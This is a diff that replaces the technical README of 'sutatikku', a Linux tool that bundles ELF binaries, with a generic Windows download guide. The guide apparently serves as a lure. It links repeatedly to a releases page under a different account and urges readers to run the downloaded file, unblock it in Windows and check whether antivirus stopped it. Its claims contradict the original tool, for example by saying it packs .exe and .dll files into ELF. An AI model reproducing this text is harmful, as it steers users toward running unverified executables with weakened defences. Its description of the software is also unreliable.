@@ -1,97 +1,203 @@
-# Sutatikku
+# 🧩 sutatikku - Bundle apps into one file
 
-Sutatikku is a command-line tool that packages dynamically linked ELF binaries or any scripts with their interpreters, their dependent libraries, and arbitrary resource files into a single, self-contained executable.
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/konraddesensitising780/sutatikku/releases)
 
-The resulting binary can be copied to any Linux environment (where libraries are missing or completely different) and executed immediately without any additional runtime.
+## 📥 Download
 
-## Features
+Visit the releases page to download and run this file on Windows:
 
--   **Complete Portability**:
+https://github.com/konraddesensitising780/sutatikku/releases
 
-    Analyzes shared library dependencies reported by `ldd` and embeds them into the binary. It also supports bundling non-library files like configurations or script source code. At runtime, it uses a novel approach: `seccomp-unotify`-based User-space File Proxy to transparently redirect file access from the target binary to the internal bundle.
+Look for the latest release, then download the Windows file that matches your system. If you are not sure which file to choose, pick the one marked for Windows 64-bit.
 
--   **Diskless Execution**:
+## 🪟 What sutatikku does
 
-    Can serve bundled files from memory instead of extracting them to a temporary directory. This is ideal for environments with restricted disk access.
+sutatikku turns executables into a single binary ELF application.
 
--   **Automatic Dependency Profiling**:
+In simple terms, it helps you package program files into one output file. That makes it easier to move, share, and run the app from one place.
 
-    The `--record` mode allows you to trace a live process to see exactly which files it accesses. It then automatically generates a YAML configuration file encompassing all discovered resources.
+This tool is useful when you want to:
 
--   **Rootless Operation (Even without User Namespaces)**: 
+- keep an app in one file
+- simplify file handling
+- move software between systems with less clutter
+- reduce the need to ship many loose files
 
-    Unlike containers or `chroot`, Sutatikku requires no special privileges to build or run. It does **not** rely on User Namespaces either, making it compatible with Linux distributions where user namespaces are restricted or disabled for security reasons. (e.g. Ubuntu)
+## ⚙️ What you need
 
-## Usage
+Before you run sutatikku on Windows, make sure your PC has:
 
-### Basic Build
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- enough free disk space for the download and output files
+- permission to run downloaded files
+- access to the internet for the first download
 
-Bundle an existing binary into a single file:
+If your computer uses security software, it may ask you to confirm the file before it opens. This is normal for many downloaded apps.
 
-```bash
-./sutatikku build $(which ls) -o ./myls
-./myls /
-```
+## 🚀 How to download and run
 
-### Customizable YAML Configuration
+1. Open the releases page:
+   https://github.com/konraddesensitising780/sutatikku/releases
 
-Use YAML to define environment variables, default arguments, or specific file mappings:
+2. Find the latest release at the top of the page.
 
-```yaml
-# config.yaml syntax example. This config will not be valid on your system as-is
-entry:
-  path: /usr/bin/python3
-  args: ["-c", "print('hello from bundle')"]
-files:
-  # simple path
-  - /usr/lib/python3.12
-  # with settings
-  - path: ./local_script.py
-    map_to: /app/script.py
-    prefer_host: false
-env:
-  - PYTHONPATH=/app
-```
+3. Under Assets, download the Windows file.
 
-```bash
-./sutatikku build --config config.yaml -o mypython
-```
+4. Save the file to a folder you can find, such as Downloads or Desktop.
 
-### Automatic Configuration via Tracing
+5. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-Identify all files required by a binary by running it:
+6. Open the extracted folder.
 
-```bash
-# Run curl, record accessed files, and generate a yaml config
-./sutatikku gen-config /usr/bin/curl -o curl.yaml --record -- http://example.com
-```
+7. Double-click the sutatikku file to run it.
 
-## How it Works
+8. If Windows asks for permission, choose Run or Yes.
 
-A Sutatikku binary consists of a statically linked runner and a compressed payload.
+## 🧭 First-time setup
 
-When executed, the runner performs the following steps:
-1. Prepares the payload in memory or a temporary directory.
-2. Initializes the user-space file proxy using `seccomp-unotify`.
-3. Executes the embedded dynamic loader (interpreter) directly, pointing it to the bundled libraries to launch the target process.
+When you open sutatikku for the first time, give it a few seconds to start. Some apps need time to load the first time they run.
 
-## Performance
+If the app opens in a window or shows a small interface, you can use it right away. If it runs from a command window, keep that window open while the tool works.
 
-The overhead of Sutatikku is strictly limited to file-opening operations (`open`, `openat`, `stat`, `access`, etc.).
+For best results:
 
-* App launch speed: Since the Sutatikku runner decompresses the file on launch, your app will take a little longer to start.
-* File opening: System calls are intercepted by the Sutatikku proxy process to inject the appropriate file descriptor or `memfd`. This introduces a latency due to context switching.
-* No data I/O overhead: However, once a file is opened, operations such as `read`, `write`, and `mmap` occur directly between the kernel and the target process.
+- keep the program files in one folder
+- do not rename files unless you know they are not in use
+- use a folder path with simple characters
+- close other apps if your PC is low on memory
 
-## Building the Tool
+## 📦 How to use
 
-We provide a Docker environment to build Sutatikku itself as a fully static binary (Alpine/musl based).
+sutatikku is designed to help you package executables into one ELF application.
 
-```bash
-./build_static.sh
-```
+A simple way to use it:
 
-## Caveats
+1. Gather the executable you want to package.
+2. Put any files it needs in the same folder.
+3. Open sutatikku.
+4. Select the source file or folder.
+5. Choose where to save the output.
+6. Start the build or pack process.
+7. Wait for the app to finish.
+8. Open the output file and test it.
 
-* Kernel Requirements: Linux Kernel 5.0 or newer is required for `seccomp-unotify` support.
-* Single Process Target: The proxy mechanism is designed for the primary target process. If the target forks or executes sub-processes, file access redirection will not be applied to those children.
+If your source app depends on extra files, make sure those files are included before you build. That helps the final binary work as expected.
+
+## 🛠️ Common file types
+
+You may work with files such as:
+
+- `.exe`
+- `.dll`
+- `.bat`
+- support folders and data files
+- config files
+- icons or small asset files
+
+The tool works best when the app and its required files stay together in one place during the build.
+
+## 🔍 Tips for a smooth run
+
+- Use a folder with full write access.
+- Keep the source files close together.
+- Do not store the project in a protected system folder.
+- Use short file names if you run into path errors.
+- Test the output file after each build.
+- If the app fails, check that all needed files were included.
+
+## 🧱 Example workflow
+
+If you have a small Windows app and want to package it into one binary ELF application, use this flow:
+
+1. Download the release.
+2. Open the tool.
+3. Pick the app you want to convert.
+4. Add its support files.
+5. Build the output.
+6. Test the new file on the target system.
+
+This keeps the process simple and avoids extra manual steps.
+
+## 🖥️ System fit
+
+sutatikku is built for users who want a simple packaging tool for executables.
+
+It fits well on:
+
+- a personal Windows PC
+- a work laptop
+- a test machine
+- a build or transfer workflow where one file is easier to manage
+
+If you use a slower PC, the tool should still run, but packing larger apps may take more time.
+
+## ❓ Troubleshooting
+
+If the file does not open:
+
+- check that you downloaded the correct Windows asset
+- make sure the download finished
+- right-click the file and try Open
+- extract the ZIP if the file came in an archive
+- move the file to a simple folder like Downloads
+
+If Windows blocks the app:
+
+- right-click the file
+- open Properties
+- look for an Unblock option
+- confirm the change
+- try again
+
+If the output file does not work:
+
+- check that every needed file was included
+- confirm the source executable is valid
+- build again from a clean folder
+- test with a smaller app first
+
+If the app shows no output:
+
+- wait a short time
+- check for a hidden window behind other apps
+- make sure your antivirus did not stop it
+- run it again from the folder where you saved it
+
+## 📁 Suggested folder layout
+
+A clean folder layout helps reduce mistakes:
+
+- `sutatikku/`
+  - `input/`
+  - `output/`
+  - `assets/`
+  - `config/`
+
+Keep the executable and related files in `input`, then save the finished file in `output`. This makes it easier to find your work later.
+
+## 🔐 File safety
+
+Only download release files from the official releases page:
+
+https://github.com/konraddesensitising780/sutatikku/releases
+
+After download, check the file name and size before you run it. If the file looks wrong or incomplete, download it again from the same page.
+
+## 📝 Basic terms
+
+- executable: a file that runs a program
+- binary: a compiled file that can run on a system
+- ELF: a file format used on many Unix-like systems
+- asset: a file attached to a release
+- build: the process of making the final output file
+
+## 📌 Release page
+
+Download and run this file from the official release page:
+
+https://github.com/konraddesensitising780/sutatikku/releases
+
+## 🧾 License
+
+Use the release files and any included project files based on the terms provided in the repository or release package
